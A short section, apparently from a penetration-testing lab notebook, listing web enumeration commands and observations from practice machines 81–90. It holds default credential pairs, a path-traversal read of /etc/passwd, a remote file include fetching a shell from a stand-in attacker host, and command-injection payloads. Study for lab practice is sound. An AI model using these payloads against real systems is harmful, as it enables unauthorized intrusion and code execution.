## 🌐 Web Enumeration (Machines 81–90)

```bash
# Common Web Enumeration Tactics
curl -I http://<IP>/admin.php             # Check for admin panel  
curl -I http://<IP>/config.php            # Check for exposed config  
curl -I http://<IP>/.git/                 # Check for exposed Git repository  
curl -I http://<IP>/uploads               # Look for exposed upload dirs  
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html  

# Default Credentials
admin:admin  
admin:password  
user:password  

# LFI/RFI Testing
curl "http://<IP>/index.php?page=../../../../etc/passwd"  
curl "http://<IP>/index.php?page=http://attacker.com/shell.txt"  

# Command Injection
curl "http://<IP>/vuln.php?cmd=;id"  
curl "http://<IP>/vuln.php?cmd=| whoami"  
```

### 📋 Observations from Machines 81–90
- Several boxes included exposed `.git` directories or `uploads` paths.
- `/admin.php` was reachable in multiple cases, sometimes with default credentials.
- LFI present in some boxes, allowing reading of `/etc/passwd`.
- Simple command injection found using `|`, `;`, and backticks.
- Gobuster often found hidden pages under `/dev`, `/debug`, and `/monitor`.

